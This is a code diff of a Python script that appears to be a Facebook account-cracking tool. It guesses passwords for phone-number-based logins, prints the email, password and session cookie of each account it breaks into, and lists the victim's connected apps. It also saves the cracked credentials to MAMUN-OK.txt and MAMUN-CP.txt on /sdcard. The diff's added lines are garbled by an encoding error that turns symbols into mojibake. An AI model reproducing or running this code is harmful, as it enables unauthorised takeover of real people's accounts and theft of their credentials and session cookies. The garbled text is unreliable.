@@ -71,7 +71,7 @@ def clear():
     os.system('clear')
     print(logo)
 logo =f"""____________________
-AUTHOR     : Mamun�
+AUTHOR     : Mamun
 VERSION     : 1.1
                                    [LOVE YOU HATERS]
 ____________________
@@ -106,9 +106,9 @@ def cek_apk(session,coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS 🎮%s  '%(ORANGE))
+        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ðŸŽ®%s  '%(ORANGE))
     else:
-        print(f'\r {GREEN}[√] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
+        print(f'\r {GREEN}[âˆš] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
         for i in range(len(game)):
             print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
@@ -118,14 +118,14 @@ def cek_apk(session,coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS 🎮%s'%(ORANGE))
+        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ðŸŽ®%s'%(ORANGE))
     else:
-        print(f'\r 🎮  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
+        print(f'\r ðŸŽ®  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
         for i in range(len(game)):
             print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
-            print(f"{GREEN}[√]---------------------------------------------------[√]")
+            print(f"{GREEN}[âˆš]---------------------------------------------------[âˆš]")
     #____________#
-def xyz():
+def menu ():
     #os.system("play-audio WELCOME_TO_MAMUM_BOOT_818.mp3")
     os.getuid
     os.system("clear");print(logo)
@@ -135,7 +135,7 @@ def xyz():
     print(f"[00] {WHITE}EXIT PROGRAM ")
     print(f"")
     print(f"\033[1;91m========================================================")
-    MAMUN = input("[√] CHOOSE : ")
+    MAMUN = input("[âˆš] CHOOSE : ")
     if MAMUN in ["1","01"]:
         Random()
     elif MAMUN in ["0","00"]:
@@ -159,7 +159,7 @@ def Random():
     print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
     print(f"")
     linex()
-    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
+    print(f"        \x1b[97m[\033[95;42mEXAMPLE :ðŸ‘‡\033[0;m]")
     print(f"")
     print(f" 017 ,019,018 ,015")
     print(f" 013 ,014 ,016")
@@ -228,7 +228,7 @@ def free(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\033[1;32m[√]---------------------[MAMUN-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
+                print('\r\033[1;32m[âˆš]---------------------[MAMUN-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                 cek_apk(session,coki)
                 open('/sdcard/MAMUN-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -237,7 +237,7 @@ def free(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid=coki[24:39]
                 Red = '\033[1;31m'
-                print(f'\r{Red}[×]--------------------[MAMUN-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
+                print(f'\r{Red}[Ã—]--------------------[MAMUN-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
                 open('/sdcard/MAMUN-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
